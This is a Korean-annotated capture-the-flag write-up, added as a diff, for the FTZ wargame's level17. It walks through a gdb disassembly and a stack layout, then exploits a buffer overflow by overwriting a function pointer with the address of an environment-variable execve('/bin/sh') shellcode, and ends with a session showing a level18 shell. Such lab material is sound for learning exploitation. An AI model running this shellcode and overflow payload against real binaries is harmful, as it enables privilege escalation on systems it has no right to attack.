@@ -1,0 +1,120 @@
+[level17@ftz level17]$ cp attackme tmp
+[level17@ftz level17]$ cd tmp
+[level17@ftz tmp]$ gdb -q attackme
+Reading symbols from /home/level17/tmp/attackme...done.
+(gdb) disas main
+
+   0x080484a8 <+0>:     push   %ebp
+   0x080484a9 <+1>:     mov    %esp,%ebp
+   - 함수 프롤로그
+
+   0x080484ab <+3>:     sub    $0x38,%esp
+   - 스택(esp)에 56byte 만큼 공간 확보
+
+   0x080484ae <+6>:     movl   $0x8048490,-0x10(%ebp)
+   - 0x8048490 <printit> [ebp-0x10]
+
+   0x080484b5 <+13>:    sub    $0x4,%esp
+   - 스택에 4byte 만큼 공간 확보
+
+   0x080484b8 <+16>:    pushl  0x804967c
+   - 0x804967c <stdin@@GLIBC_2.0>:    ""
+
+   0x080484be <+22>:    push   $0x30
+   - 48byte push
+
+   0x080484c0 <+24>:    lea    -0x38(%ebp),%eax
+   - [ebp-0x38] 주소 값을 eax에 대입한다.
+   - [ebp-0x38]는 buf의 시작 주소이다.
+
+   0x080484c3 <+27>:    push   %eax
+   - eax push
+
+   0x080484c4 <+28>:    call   0x8048350 <fgets@plt>
+   - 0x8048350 <fgets@plt>
+
+   0x080484c9 <+33>:    add    $0x10,%esp
+   - esp에서 16byte 만큼 공간 제거
+
+   0x080484cc <+36>:    sub    $0x8,%esp
+   - 스택에 8byte 만큼 공간 확보
+
+   0x080484cf <+39>:    push   $0xc1a
+   - 0xc1a(3098)을 스택에 push
+
+   0x080484d4 <+44>:    push   $0xc1a
+   - setreuid 함수를 호출
+
+   0x080484d9 <+49>:    call   0x8048380 <setreuid@plt>
+   - 0x8048380 <setreuid@plt>
+
+   0x080484de <+54>:    add    $0x10,%esp
+   - esp에서 16byte 만큼 공간 제거
+
+   0x080484e1 <+57>:    mov    -0x10(%ebp),%eax
+   -[ebp-0x10]을 eax에 대입
+
+   0x080484e4 <+60>:    call   *%eax
+   - eax(ebp-0x10)에 잇는 함수 포인터 call 함수를 이용하여 printit 함수 호출
+
+   0x080484e6 <+62>:    leave
+   0x080484e7 <+63>:    ret
+   - 함수 에필로그
+
+
+   gdb 분석하고 스택 구조 그림
+ [낮은 주소]
+         buf   20      <- ebp -56 위치
+         dummy 20byte
+                       <- ebp -16 위치
+         /*call  4byte  <- 'shell 함수 주소 삽입'*/
+         crap  4byte
+         dummy 8byte
+         sfp   4byte
+         ret   4byte
+
+  4. BoF
+
+  - 포인터 함수 call에 쉘 코드 주소 삽입
+  [낮은 주소]
+          buf    20      a*20개
+          dummy  20byte  a*20개
+          call   4byte
+          crap   4byte
+          dummy  8byte
+          sfp    4byte
+          ret    4byte
+
+    쉘코드 ==  export SHELLCODE=$(python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')
+
+  2) 'SHELLCODE' 주소찾기(환경 변수 주소?)
+
+  [level17@ftz tmp]$ ./shellcode SHELLCODE
+                    SHELLCODE Address = 0xbffffbc3
+
+  3) BoF 공격
+  - 포인터 함수 call에 쉘 코드 주소 삽입
+  [낮은 주소]
+          buf    20      a*20개
+          dummy  20byte  a*20개
+          call   4byte
+          crap   4byte
+          dummy  8byte
+          sfp    4byte
+          ret    4byte
+  4) '0xbffffbc3' -> 리틀 엔디안 방식으로 변경
+  0xbffffbc3      \wc3\xfb\xff\xbf
+
+  5) 페이로드 제작
+
+  "a"40 + "\wc3\xfb\xff\xbf"
+  ex ) (python -c 'print("a"*40 + "\wc3\xfb\xff\xbf")';cat) | ./attackme
+       (python -c 'print("a"*40 + "\xc3\xfb\xff\xbf")';cat) | ./attackme
+
+ [level17@ftz tmp]$ cd
+ [level17@ftz level17]$ (python -c 'print("a"*40 + "\xc3\xfb\xff\xbf")';cat) | ./attackme
+ id
+ uid=3098(level18) gid=3097(level17) groups=3097(level17)
+
+ my-pass
+ TERM environment variable not set.
